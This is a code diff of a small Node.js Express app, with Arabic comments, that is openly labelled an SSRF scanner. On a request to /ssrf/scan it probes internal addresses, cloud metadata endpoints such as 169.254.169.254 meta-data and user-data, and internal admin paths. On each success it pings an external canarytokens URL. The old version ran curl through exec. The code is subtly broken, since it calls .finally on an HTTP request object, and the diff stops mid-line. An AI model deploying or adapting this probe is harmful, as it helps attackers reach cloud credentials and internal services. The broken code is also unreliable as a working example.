@@ -1,33 +1,46 @@
-const express = require("express");
-const { exec } = require("child_process");
-
+// index.js
+const https = require('https');
+const http = require('http');
+const express = require('express');
 const app = express();
-const PORT = 10000;
+const PORT = process.env.PORT || 10000;
 
-app.get("/ssrf/scan", (req, res) => {
-  const targets = [
-    "http://127.0.0.1:80/",
-    "http://localhost:80/",
-    "http://169.254.169.254/latest/meta-data/",
-    "http://metadata.google.internal/computeMetadata/v1/",
-  ];
+// قائمة أهداف داخلية نجربها
+const TARGETS = [
+  'http://127.0.0.1:80',
+  'http://canarytokens.com/articles/qczfimih1tdawvj4ijjldi9fp/contact.php',
+  'http://localhost:80',
+  'http://169.254.169.254/latest/meta-data/',
+  'http://169.254.169.254/latest/user-data/',
+  'http://internal.website/admin',
+  'http://internal-api/admin',
+];
 
-  let results = [];
+// رابط التبليغ حقك
+const PING_URL = 'https://canarytokens.com/abc123';  // غيّره
 
-  const runCurl = (index) => {
-    if (index >= targets.length) {
-      return res.send(results.join("\n"));
-    }
+function tryTargetsSequentially(targets, notify) {
+  const tryNext = (index) => {
+    if (index >= targets.length) return;
 
-    exec(`curl -m 3 -s -i ${targets[index]}`, (error, stdout, stderr) => {
-      results.push(`==> ${targets[index]}\n${stdout || stderr}`);
-      runCurl(index + 1);
+    console.log(`🚀 Trying: ${targets[index]}`);
+    http.get(targets[index], (res) => {
+      console.log(`✅ SUCCESS: ${targets[index]} - Status: ${res.statusCode}`);
+      // تبليغ خارجي عند أول نجاح
+      https.get(PING_URL);
+    }).on('error', (err) => {
+      console.log(`❌ FAILED: ${targets[index]} - ${err.message}`);
+    }).finally(() => {
+      setTimeout(() => tryNext(index + 1), 1000); // انتظار بين الطلبات
     });
   };
 
-  runCurl(0);
+  tryNext(0);
+}
+
+app.get('/ssrf/scan', (req, res) => {
+  res.send('✅ SSRF Handler Triggered. Scanning targets.');
+  tryTargetsSequentially(TARGETS);
 });
 
-app.listen(PORT, () => {
-  console.log(`🔥 SSRF Scanner running on http://localhost:${PORT}`);
-});
+app.listen(PORT, ()
